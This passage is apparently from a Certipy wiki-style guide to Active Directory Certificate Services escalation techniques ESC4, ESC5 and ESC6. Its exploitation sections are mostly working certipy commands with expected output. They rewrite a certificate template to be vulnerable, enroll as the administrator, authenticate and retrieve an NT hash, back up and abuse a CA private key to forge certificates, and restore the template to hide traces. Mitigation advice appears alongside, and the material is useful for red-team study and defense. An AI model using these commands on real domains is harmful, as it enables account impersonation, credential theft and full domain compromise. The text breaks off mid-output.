    * Add a "Client Authentication" or "Any Purpose" EKU.
    * Remove security controls like "CA certificate manager approval" or the requirement for authorized signatures.

    Once the template is reconfigured into a vulnerable state, the attacker (or anyone now permitted by the modified template) can enroll for a certificate, potentially specifying a privileged identity and thereby impersonating an administrator. This makes ESC4 an indirect but highly effective privilege escalation vector, as it allows an attacker to create the conditions for other AD CS exploits.

    By default, only high-privilege groups like "Enterprise Admins" can create and modify certificate templates. However, misconfigurations in AD permissions or improper delegation of rights on template objects can expose this attack surface to less privileged users.

    It's important to note that ESC4 abuse focuses on modifying the template object's attributes in AD. An attacker cannot use ESC4 to make a CA *start* issuing certificates based on a template if that template is not already enabled on the CA. Enabling or disabling which templates a CA offers is typically an ESC7-level action, requiring `Manage CA` rights on the CA object itself. Certipy's `find` command correlates templates defined in AD with the CAs that publish them (visible in the "Certificate Authorities" field for a template). If a template is not published by any CA, modifying it via ESC4 will not directly lead to certificate issuance until it is also enabled on a CA.

2. **Identification with Certipy**

    Certipy's `find` command enumerates certificate templates and their ACLs. To identify potential ESC4 vulnerabilities, examine the "Object Control Permissions" section for each template listed in the `certipy find` output. If low-privileged users or groups possess `Full Control`, `Write Dacl`, `Write Owner`, or specific `Write Property` rights (especially on attributes like `msPKI-Enrollment-Flag`, `msPKI-Certificate-Name-Flag`, `pKIExtendedKeyUsage`, `nTSecurityDescriptor`), an ESC4 condition likely exists. The `[+] User ACL Principals` field will highlight if the current user context has any of these dangerous control rights.

    **Expected Output Snippet:**

    Look for dangerous permissions granted to non-administrative principals, and the `ESC4` flag.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
    ...
    Certificate Templates
      ...
      0
        Template Name                       : SecureFiles
        Display Name                        : SecureFiles
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        Client Authentication               : False
        Enrollment Agent                    : False
        Any Purpose                         : False
        Enrollee Supplies Subject           : False
        Certificate Name Flag               : SubjectAltRequireUpn
                                              SubjectRequireDirectoryPath
        Enrollment Flag                     : IncludeSymmetricAlgorithms
                                              PendAllRequests
                                              PublishToDs
                                              AutoEnrollment
        Private Key Flag                    : ExportableKey
        Extended Key Usage                  : Encrypting File System
        Requires Manager Approval           : True
        Requires Key Archival               : False
        RA Application Policies             : Certificate Request Agent
        Authorized Signatures Required      : 1
        Schema Version                      : 2
        Validity Period                     : 1 year
        Renewal Period                      : 6 weeks
        Minimum RSA Key Length              : 2048
        Template Created                    : 2025-05-10T11:59:20+00:00
        Template Last Modified              : 2025-05-10T11:59:20+00:00
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Admins
                                              CORP.LOCAL\Domain Users
                                              CORP.LOCAL\Enterprise Admins
          Object Control Permissions
            Owner                           : CORP.LOCAL\Administrator
            Full Control Principals         : CORP.LOCAL\Domain Admins
                                              CORP.LOCAL\Enterprise Admins
                                              CORP.LOCAL\Authenticated Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
                                              CORP.LOCAL\Domain Users
        [+] User ACL Principals             : CORP.LOCAL\Authenticated Users
        [!] Vulnerabilities
          ESC4                              : User has dangerous permissions.
    ```

    **Key indicators:**

    * Certipy's explicit flag: `[!] Vulnerabilities ESC4 : User has dangerous permissions.`
    * The `[+] User ACL Principals` field indicates that the current user possesses some form of write/control rights over the template object, often inherited from a group like `CORP.LOCAL\Authenticated Users` if that group is listed under `Full Control Principals`, `Write Owner Principals`, or `Write Dacl Principals`.
    * Any non-administrative user or overly broad group listed under `Full Control Principals`, `Write Owner Principals`, `Write Dacl Principals`, or specific `Write Property` ACEs for critical template attributes.

3. **Exploitation with Certipy**

    Exploiting ESC4 involves an attacker with write permissions on a template first modifying it to a vulnerable configuration (e.g., to resemble an ESC1 scenario), then requesting a certificate using this maliciously altered template, and finally, potentially reverting the changes to cover their tracks. Assume the attacker is `attacker@corp.local` and has obtained write permissions on the "SecureFiles" template (perhaps through membership in `Authenticated Users` if that group has excessive rights as shown in the identification snippet).

    * **Step 1: Modify the template to a vulnerable state.**
        Certipy's `template` command with the `-write-default-configuration` option is a convenient way to automatically reconfigure a target template to a known ESC1-like vulnerable state. This option typically:

        * Enables "Enrollee Supplies Subject" (`msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT`).
        * Adds the "Client Authentication" EKU (`pKIExtendedKeyUsage` and `msPKI-Certificate-Application-Policy`).
        * Grants "Full Control" (which includes enrollment rights) on the template to the "Authenticated Users" group (by modifying `nTSecurityDescriptor`).
        * Disables manager approval (`msPKI-Enrollment-Flag` adjusted, `PendAllRequests` removed).
        * Sets "Authorized Signatures Required" to 0 (`msPKI-RA-Signature = 0`).
        * Clears any existing RA Application Policies (`msPKI-RA-Application-Policies`).
            This command also automatically saves the template's original configuration to a JSON file before applying changes.

        ```bash
        certipy template \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -template 'SecureFiles' \
            -write-default-configuration
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Saving current configuration to 'SecureFiles.json'
        [*] Wrote current configuration for 'SecureFiles' to 'SecureFiles.json'
        [*] Updating certificate template 'SecureFiles'
        [*] Deleting:
        [*]     msPKI-RA-Application-Policies: []
        [*] Replacing:
        [*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
        [*]     flags: 66104
        [*]     pKIDefaultKeySpec: 2
        [*]     pKIKeyUsage: b'\x86\x00'
        [*]     pKIMaxIssuingDepth: -1
        [*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
        [*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
        [*]     msPKI-RA-Signature: 0
        [*]     msPKI-Enrollment-Flag: 0
        [*]     msPKI-Private-Key-Flag: 16
        [*]     msPKI-Certificate-Name-Flag: 1
        [*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
        Are you sure you want to apply these changes to 'SecureFiles'? (y/N): y
        [*] Successfully updated 'SecureFiles'
        ```

        The original configuration is backed up to `SecureFiles.json`. The template "SecureFiles" is now reconfigured to be vulnerable to ESC1. *Note: Enterprise CAs periodically poll Active Directory for template changes. It might take a few minutes (up to several hours, depending on CA configuration and AD replication) for the CA to recognize and load the updated template configuration.*

        After this modification, the template "SecureFiles" as reported by `certipy find` would look like this:

        ```text
        Certificate Templates
          ...
          0
            Template Name                       : SecureFiles
            Display Name                        : SecureFiles
            Certificate Authorities             : CORP-CA
            Enabled                             : True
            Client Authentication               : True
            Enrollment Agent                    : False
            Any Purpose                         : False
            Enrollee Supplies Subject           : True
            Certificate Name Flag               : EnrolleeSuppliesSubject
            Private Key Flag                    : ExportableKey
            Extended Key Usage                  : Client Authentication
            Requires Manager Approval           : False
            Requires Key Archival               : False
            Authorized Signatures Required      : 0
            Schema Version                      : 2
            Validity Period                     : 1 year
            Renewal Period                      : 6 weeks
            Minimum RSA Key Length              : 2048
            Template Created                    : 2025-05-10T11:59:20+00:00
            Template Last Modified              : 2025-05-13T22:17:37+00:00
            Permissions
              Object Control Permissions
                Owner                           : CORP.LOCAL\Administrator
                Full Control Principals         : CORP.LOCAL\Authenticated Users
                Write Owner Principals          : CORP.LOCAL\Authenticated Users
                Write Dacl Principals           : CORP.LOCAL\Authenticated Users
            [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
            [+] User ACL Principals             : CORP.LOCAL\Authenticated Users
            [!] Vulnerabilities
              ESC1                              : Enrollee supplies subject and template allows client authentication.
              ESC4                              : User has dangerous permissions.
        ```

        Key changes to note in the modified template:

        * `Client Authentication` is now `True`.
        * `Enrollee Supplies Subject` is now `True`.
        * `Permissions` -> `Object Control Permissions` now show `CORP.LOCAL\Authenticated Users` having `Full Control`, which implicitly grants them `Enrollment Rights`.
        * `Requires Manager Approval` is `False`.
        * `Authorized Signatures Required` is `0`.
        * `RA Application Policies` (if previously present) has been deleted.
            The template is now flagged with ESC1 due to these changes.

    * **Step 2: Request a certificate using the modified template.**
        The attacker now requests a certificate for a privileged user (e.g., Administrator), leveraging the ESC1 vulnerability they just created in the "SecureFiles" template.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'SecureFiles' \
            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
        ```

        *See ESC1 for details on the `-upn` and `-sid` parameters.*

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        The attacker obtains `administrator.pfx`.

    * **Step 3: Authenticate using the obtained certificate.**

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator@corp.local'
        [*]     SAN URL SID: 'S-1-5-21-...-500'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        The attacker now has privileged access as Administrator.

    * **Step 4: (Optional) Revert template changes.**
        To restore the original template configuration and remove traces of the malicious modification, the attacker uses the `SecureFiles.json` file saved in Step 1.

        ```bash
        certipy template \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -template 'SecureFiles' \
            -write-configuration 'SecureFiles.json' -no-save
        ```

        * `-write-configuration 'SecureFiles.json'`: Applies the configuration from the specified JSON file.
        * `-no-save`: Prevents Certipy from creating another backup of the (now malicious) configuration it's about to overwrite.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Updating certificate template 'SecureFiles'
        [*] Adding:
        [*]     msPKI-RA-Application-Policies: ['1.3.6.1.4.1.311.20.2.1']
        [*] Replacing:
        [*]     nTSecurityDescriptor: b"\x01\x00\x04\x9cD\x01\x00\x00\x00\x00...\x80\xaf\xa4\xf4\x01\x00\x00"
        [*]     flags: 131640
        [*]     pKIDefaultKeySpec: 1
        [*]     pKIKeyUsage: b' \x00'
        [*]     pKIMaxIssuingDepth: 0
        [*]     pKICriticalExtensions: ['2.5.29.15']
        [*]     pKIExtendedKeyUsage: ['1.3.6.1.4.1.311.10.3.4']
        [*]     msPKI-RA-Signature: 1
        [*]     msPKI-Enrollment-Flag: 43
        [*]     msPKI-Private-Key-Flag: 16842768
        [*]     msPKI-Certificate-Name-Flag: -2113929216
        [*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.4.1.311.10.3.4']
        [*] Successfully updated 'SecureFiles'
        ```

        The "SecureFiles" template is now restored to its original state. The specific attribute values in the output will correspond to the original template's settings.

        Alternatively, to manually save the template configuration first (without immediately writing a default vulnerable config):

        ```bash
        certipy template \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -template 'SecureFiles' \
            -save-configuration 'SecureFiles_backup.json'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Saving current configuration to 'SecureFiles_backup.json'
        [*] Wrote current configuration for 'SecureFiles' to 'SecureFiles_backup.json'
        ```

4. **Mitigations**

    * **Audit and Enforce Least Privilege on Template ACLs:** Regularly review the ACLs of all certificate template objects in Active Directory (`CN=Certificate Templates,CN=Public Key Services,...`). Ensure that only highly trusted administrative groups (e.g., "Enterprise Admins" or a dedicated PKI/Template Administrators group) have write permissions like `FullControl`, `WriteDACL`, `WriteOwner`, or `WriteProperty` on critical attributes.
    * **Utilize AD Auditing Tools:** Employ tools like BloodHound (with AD CS data collection) or PingCastle to help identify and visualize risky permissions on AD CS objects, including certificate templates.
    * **Disable Unused Templates:** If a template is found to be vulnerable due to loose permissions and is not actively needed, consider disabling it or removing it from being published by CAs.

---

## **ESC5: Vulnerable PKI Object Access Control**

1. **Description**

    ESC5 refers to privilege escalation vulnerabilities stemming from improperly configured ACLs on various PKI-related objects within Active Directory. This category is distinct from ESC4 (which focuses on ACLs of individual certificate *template* objects) and ESC7 (which focuses on permissions directly on the CA *object* or its services). The critical PKI objects involved in ESC5 are typically located in the Configuration Naming Context of Active Directory (e.g., under `CN=Public Key Services,CN=Services,CN=Configuration,DC=...`) and play crucial roles in the PKI's overall operation and trust model.

    If an attacker gains `Write` permissions (such as `WriteDACL`, `WriteOwner`, `WriteProperty` on sensitive attributes, or `FullControl`) over these critical AD objects, they could potentially:

    * Modify the `NTAuthCertificates` store (`CN=NTAuthCertificates,CN=Public Key Services,...`): This object publishes certificates of CAs that are trusted for domain authentication (e.g., for Kerberos PKINIT). Adding an attacker-controlled CA certificate here could allow the attacker's "rogue" CA to issue certificates trusted for domain authentication.
    * Alter Authority Information Access (AIA) or CRL Distribution Point (CDP) paths published in AD: These are often stored as objects under `CN=AIA,CN=Public Key Services,...` or `CN=CDP,CN=Public Key Services,...` linked to specific CA objects. Modifying these could redirect certificate validation processes, potentially leading to denial of service or facilitating other attacks if validation can be influenced.
    * Manipulate other PKI configuration objects: For instance, objects defining OID policies or enrollment agent restrictions might be targeted if their ACLs are weak.

    Exploiting ESC5 often involves an attacker modifying these AD objects to either issue unauthorized certificates (e.g., by trusting a rogue CA), escalate privileges (a notable example being the path from Domain Admin to Enterprise Admin by controlling forest-wide PKI trust objects, as detailed by SpecterOps), or create persistent backdoors within the PKI infrastructure. The SpecterOps blog post "[From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)" provides a detailed example of such an escalation by gaining control over objects that define PKI trust at a forest level.

2. **Identification**

    Certipy **does not** directly detect ESC5 vulnerabilities by analyzing the ACLs of these miscellaneous PKI AD objects. Identifying ESC5 requires a broader audit of ACLs on various PKI-related objects within Active Directory, typically performed with other tools.

    * **Recommended Tools for Identification:**
        * **BloodHound:** With appropriate data collection that includes ACLs for these specific AD objects (often requiring custom queries or extensions to default collectors).
        * **PowerShell:** Using AD cmdlets like `Get-Acl` combined with `Get-ADObject` to target specific distinguished names of PKI objects.
        * **Manual Inspection:** Using tools like `ADSIEdit.msc` or `ldp.exe` to navigate the Configuration Naming Context and inspect the security descriptors of PKI objects.
    * **Key AD Objects to Inspect:** Focus on objects within `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`, including but not limited to:
        * `CN=NTAuthCertificates` (the object itself)
        * `CN=AIA` (the container and CA-specific objects within)
        * `CN=CDP` (the container and CA-specific objects within)
        * `CN=Certificate Templates` (permissions on the *container* object itself, distinct from individual template ACLs covered by ESC4)
        * `CN=Certification Authorities` (permissions on the *container* and individual CA objects within it - direct control over a CA object's security often leans towards ESC7, but container permissions can also be an ESC5 vector)
        * Other objects detailed in the referenced SpecterOps research, such as those related to OID policies or KRA (Key Recovery Agent) objects.

    When inspecting, look for permissions allowing non-administrative users, or overly broad groups (like "Authenticated Users" or "Domain Users"), to modify these objects or their critical attributes (e.g., `WriteProperty` on `certificateThumbprint` for an object in AIA, or `WriteProperty` on `msPKI-Certificates` for the NTAuthCertificates store).

3. **Exploitation**

    Direct exploitation of ESC5 involves using standard Active Directory editing tools to modify the attributes or ACLs of the identified vulnerable PKI AD object once write access is confirmed. The specific actions depend heavily on the compromised object and the attacker's goal. Examples include:

    * Using PowerShell with `Set-AdObject` or `Set-Acl`.
    * Using `ldp.exe` or `ADSIEdit.msc` to manually change attribute values or security descriptors.

    While Certipy does not directly exploit ESC5 by modifying these AD objects, it becomes highly relevant for **post-exploitation actions if an ESC5 vulnerability (or another vector like ESC7) leads to the compromise of a Certificate Authority's signing key.** For instance, if an attacker, through ESC5, manages to make a CA server trust their rogue CA, or directly extracts an existing CA's private key, Certipy can then be used to forge arbitrary certificates ("Golden Certificates") using that compromised CA key.

    **Example Post-CA-Compromise Actions (using Certipy):**

    *(These steps assume the CA's private key has already been compromised and exported to a .pfx file, potentially as an outcome of an advanced ESC5 attack or another CA compromise method like ESC7 or stealing a backup).*

    * **Step 1: Backup the compromised CA's private key and certificate.**
        If the attacker has gained administrative control over the CA server itself (perhaps as a result of a chained ESC5 exploit or another attack), they might use Certipy's `ca -backup` feature (if they have credentials with `ManageCA` and `ManageCertificates` rights). The prompt shows an example where `administrator@corp.local` has these rights.

        ```bash
        certipy ca \
            -u 'administrator@corp.local' -p 'Passw0rd!' \
            -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -config 'CA.CORP.LOCAL\CORP-CA' -backup
        ```

        * The credentials (`-u`, `-p`) are for a user with rights to perform the backup.
        * `-ns '10.0.0.100'`: Name server for DNS resolution.
        * `-target 'CA.CORP.LOCAL'`: Target CA server.
        * `-config 'CA.CORP.LOCAL\CORP-CA'`: Specifies the CA configuration string.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Creating new service for backup operation
        [*] Creating backup
        [*] Retrieving backup
        [*] Got certificate and private key
        [*] Backed up original PFX/P12 to 'pfx.p12'
        [*] Saving certificate and private key to 'CORP-CA.pfx'
        ```

        This command saves the CA's certificate and its private signing key to `CORP-CA.pfx`. **This is the "crown jewel" for an attacker.**

    * **Step 2: Forge a certificate for a target user (e.g., Administrator) using the CA's key.**
        With the CA's private key (`CORP-CA.pfx`), the attacker can now forge certificates for any identity.

        ```bash
        certipy forge \
            -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' \
            -sid 'S-1-5-21-...-500' -crl 'ldap:///'
        ```

        * `-ca-pfx 'CORP-CA.pfx'`: The PFX file containing the compromised CA's certificate and private key.
        * `-upn 'administrator@corp.local'`: The UPN for the forged certificate.
        * `-sid 'S-1-5-21-...-500'`: The SID for the forged certificate's security extension.
        * `-crl 'ldap:///'`: Specifies a dummy CRL distribution point. As noted, the KDC typically checks for the *presence* of a CDP in the certificate but may not validate the CRL itself during initial TGT issuance if the CA is trusted and the certificate is not explicitly revoked by other means. An absent CDP can cause issues.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Saving forged certificate and private key to 'administrator_forged.pfx'
        ```

        This creates `administrator_forged.pfx`, a certificate signed by the legitimate (but compromised) CA, which will be trusted for authenticating as `administrator@corp.local`.

    * **Step 3: Authenticate using the forged certificate.**

        ```bash
        certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator@corp.local'
        [*]     SAN URL SID: 'S-1-5-21-...-500'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        The attacker gains privileged access using the forged certificate.

4. **Mitigations**

    * **Audit and Enforce Least Privilege on PKI AD Objects:** Regularly audit the ACLs on all critical PKI-related objects in the Configuration Naming Context of Active Directory. This includes `NTAuthCertificates`, AIA and CDP containers/objects, OID policy objects, and Certification Authority container objects.

---

## **ESC6: CA Allows SAN Specification via Request Attributes**

1. **Description**

    ESC6 focuses on a CA configuration setting: the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. When this flag is enabled on an Enterprise CA (typically via its policy module registry settings), it permits certificate requesters to include Subject Alternative Names (SANs) in their certificate requests by specifying a special request attribute (`san:<type>=<value>`, e.g., `san:upn=administrator@corp.local&sid=S-1-X-...`). This is highly significant because the CA will honor these SANs and embed them into the issued certificate, even if the certificate template used for the request does *not* have the "Enrollee supplies subject" (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) flag set.

    Essentially, `EDITF_ATTRIBUTESUBJECTALTNAME2` acts as a CA-wide override, allowing requesters to inject SANs into certificates issued from *any* template published by that CA, potentially bypassing template-level restrictions on subject specification. Administrators might enable this flag for operational convenience, such as allowing specific applications to request certificates with predefined DNS names or UPNs for web server certificates without modifying each template. However, it's a dangerous setting as it can implicitly make many templates vulnerable to SAN-based impersonation attacks if not meticulously managed with other controls.

    In modern, patched Active Directory environments - specifically, those with CAs and DCs that have received the May 2022 security updates addressing Certifried/CVE-2022-26923 and later - ESC6 *alone* is generally not sufficient for privilege escalation if certificates include the `szOID_NTDS_CA_SECURITY_EXT` (SID security extension). This is because the KDC prioritizes the SID from this security extension for mapping the certificate to an account during Kerberos PKINIT authentication. If an attacker uses ESC6 to inject a UPN for `Administrator` and a SID for `Administrator` into the SAN of a certificate, but the certificate is legitimately issued for the attacker's own account (and thus the SID security extension contains the attacker's SID), the KDC will use the attacker's SID, preventing impersonation.

    However, ESC6 becomes a potent component of an attack chain when combined with:

    * **ESC9 (No Security Extension on Template):** A certificate template is configured *not* to include the SID security extension.
    * **ESC16 (Security Extension Disabled on CA):** The CA itself is configured *not* to include the SID security extension in *any* issued certificates.

    In these combined scenarios (ESC6 + ESC9, or ESC6 + ESC16), the SID security extension is absent from the issued certificate. This forces the KDC (even in "Full Enforcement" mode for strong certificate binding, which is `StrongCertificateBindingEnforcement=2`) to fall back to other mapping methods. One such fallback allows the KDC to use a SID provided in the SAN if it's formatted as a specific URL: `URL=tag:microsoft.com,2022-09-14:sid:<VALUE>`. ESC6 provides the means for the attacker to inject this maliciously crafted SAN SID, thereby enabling impersonation even on fully patched DCs.

2. **Identification with Certipy**

    Certipy's `find` command inspects the CA's configuration and can detect if the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is enabled. This is typically indicated by the `User Specified SAN : Enabled` field at the CA level in the output and will be flagged as an ESC6 vulnerability.

    **Expected Output Snippet:**

    Under the "Certificate Authorities" section for the target CA, look for the `User Specified SAN` field and the `ESC6` vulnerability indicator.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
        ...
        User Specified SAN                  : Enabled
        Request Disposition                 : Issue
        ...
        Permissions
          Access Rights
            ...
            Enroll                          : CORP.LOCAL\Authenticated Users
        [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
        [!] Vulnerabilities
          ESC6                              : Enrollee can specify SAN.
        [*] Remarks
          ESC6                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
    ```

    **Key indicators:**

    * `[!] Vulnerabilities ESC6 : Enrollee can specify SAN.` This is Certipy's direct flag for the issue.
    * The line `User Specified SAN : Enabled` confirms the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is active on the CA.
    * The `[*] Remarks` often correctly states that other conditions (like ESC9 or ESC16, or an unpatched environment) might be needed for full exploitation.

3. **Exploitation with Certipy**

    The primary modern exploitation path for ESC6 involves combining it with ESC9 (template disables SID security extension) or ESC16 (CA disables SID security extension). The attacker enrolls for any template that allows client authentication and is published by the ESC6-vulnerable CA. Due to ESC6, they can add a SAN attribute to their request containing the UPN of the target (e.g., `administrator@corp.local`) and the SID of the target (e.g., `S-1-5-21-...-500`) formatted by Certipy as the special SAN URL (`URL=tag:microsoft.com,2022-09-14:sid:<VALUE>`). If the SID security extension is absent from the final certificate (due to ESC9/ESC16), the KDC will use the SID from this SAN URL for authentication.

    **Note:** If the target environment has *not* been patched with the May 2022 updates (KB5014754), or if `StrongCertificateBindingEnforcement` on DCs is set to `0` (Disabled) or `1` (Compatibility Mode without the SID extension present in certs), ESC6 might be exploitable more directly by specifying just the target UPN in the SAN, as older KDC behaviors might allow UPN-based mapping without a SID. However, the method below focuses on the more robust ESC6+ESC9/ESC16 chain.

    * **Scenario: Exploiting ESC6 in conjunction with ESC9 (Template disables SID extension) or ESC16 (CA disables SID extension)**

        * **Step 1: Request the certificate with a malicious SAN (UPN and SID URL).**
            The attacker (`attacker@corp.local`) requests a certificate.

            * `-template 'ESC9'`: Specifies a template vulnerable to ESC9 (i.e., one that is configured with `CT_FLAG_NO_SECURITY_EXTENSION`). If exploiting an ESC16 scenario (where the CA globally disables the SID extension), *any* enrollable template on that CA which permits client authentication can be used here, as the CA will strip the SID extension regardless of the template's settings.
            * `-sid S-1-5-21-...-500`: Certipy takes this SID and, when ESC6 is active and the SID security extension is known to be omitted, will format it as the required SAN URL (`URL=tag:microsoft.com,2022-09-14:sid:<VALUE>`) and include it as a request attribute. This should be the SID of the target account (e.g., a Domain Administrator).
            * `-upn administrator@corp.local`: Specifies the UPN of the target account to also be included in the SAN.

            ```bash
            certipy req \
                -u 'attacker@corp.local' -p 'Passw0rd!' \
                -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
                -ca 'CORP-CA' -template 'ESC9' \
                -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
            ```

            *(Replace `ESC9` with an actual template name that has no security extension, or any client auth template if the CA is ESC16-vulnerable).*

            **Expected Output Snippet:**

            ```text
            Certipy v5.0.0 - by Oliver Lyak (ly4k)

            [*] Requesting certificate via RPC
            [*] Request ID is 1
            [*] Successfully requested certificate
            [*] Got certificate with UPN 'administrator@corp.local'
            [*] Certificate object SID is 'S-1-5-21-...-500'
            [*] Saving certificate and private key to 'administrator.pfx'
            [*] Wrote certificate and private key to 'administrator.pfx'
            ```

            In this scenario (ESC6 + ESC9/ESC16), the output `Certificate object SID is 'S-1-5-21-...-500'` indicates that Certipy recognizes the SID provided via the `-sid` parameter (and injected into the SAN URL) will be the effective SID for authentication because the primary SID security extension (`szOID_NTDS_CA_SECURITY_EXT`) is expected to be absent from the certificate.

        * **Step 2: Authenticate using the obtained certificate.**

            ```bash
            certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
            ```

            **Expected Output Snippet:**

            ```text
            Certipy v5.0.0 - by Oliver Lyak (ly4k)

            [*] Certificate identities:
            [*]     SAN UPN: 'administrator@corp.local'
            [*]     SAN URL SID: 'S-1-5-21-...-500'
            [*] Using principal: 'administrator@corp.local'
            [*] Trying to get TGT...
            [*] Got TGT
            [*] Saving credential cache to 'administrator.ccache'
            [*] Wrote credential cache to 'administrator.ccache'
            [*] Trying to retrieve NT hash for 'administrator'
            [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
            ```

            Authentication is successful as the targeted administrator. Note that the `Certificate identities` list shows `SAN URL SID` and *not* `Security Extension SID`, confirming the SID security extension was absent and the KDC used the SID from the attacker-supplied SAN URL.

    * **Scenario: Attempting to Exploit ESC6 Standalone (SID Security Extension is Present and Enforced by KDC)**
        If neither ESC9 nor ESC16 is active (meaning the SID security extension *will* be included in the certificate by the CA and template, and will contain the *enrollee's actual SID*), attempting to use ESC6 to specify a different SID in the SAN URL will fail for impersonation if the KDC prioritizes the SID security extension.

        * **Step 1: Request certificate using ESC6 to inject SAN SID, but on a standard template (e.g., `User`) that includes the SID Security Extension.**
            The attacker (`attacker@corp.local` with SID `S-1-5-21-...-1106`) attempts to get a certificate for `administrator@corp.local` (SID `S-1-5-21-...-500`).

            ```bash
            certipy req \
                -u 'attacker@corp.local' -p 'Passw0rd!' \
                -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
                -ca 'CORP-CA' -template 'User' \
                -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
            ```

            *(Here, `S-1-5-21-...-500` is the target admin SID, but the attacker's actual SID, e.g., `S-1-5-21-...-1106`, will be in the SID security extension of the issued certificate).*

            **Expected Output Snippet:**

            ```text
            Certipy v5.0.0 - by Oliver Lyak (ly4k)

            [*] Requesting certificate via RPC
            [*] Request ID is 2
            [*] Successfully requested certificate
            [*] Got certificate with UPN 'administrator@corp.local'
            [!] Conflicting SIDs found in certificate:
            [!]     SAN URL:            'S-1-5-21-...-500'
            [!]     Security Extension: 'S-1-5-21-...-1106'
            [!] Windows will use the security extension SID for authentication purposes
            [*] Certificate object SID is 'S-1-5-21-...-1106'
            [*] Saving certificate and private key to 'administrator.pfx'
            [*] Wrote certificate and private key to 'administrator.pfx'
            ```

            Certipy correctly warns about the conflicting SIDs. The CA included the attacker-supplied SAN UPN and SAN SID (due to ESC6), but it *also* correctly included the attacker's actual SID (`S-1-5-21-...-1106`) in the `szOID_NTDS_CA_SECURITY_EXT`. Certipy indicates that this security extension SID will be prioritized by Windows.

        * **Step 2: Attempt authentication.**

            ```bash
            certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
            ```

            **Expected Output Snippet:**

            ```text
            Certipy v5.0.0 - by Oliver Lyak (ly4k)

            [*] Certificate identities:
            [*]     SAN UPN: 'administrator@corp.local'
            [*]     SAN URL SID: 'S-1-5-21-...-500'
            [*]     Security Extension SID: 'S-1-5-21-...-1106'
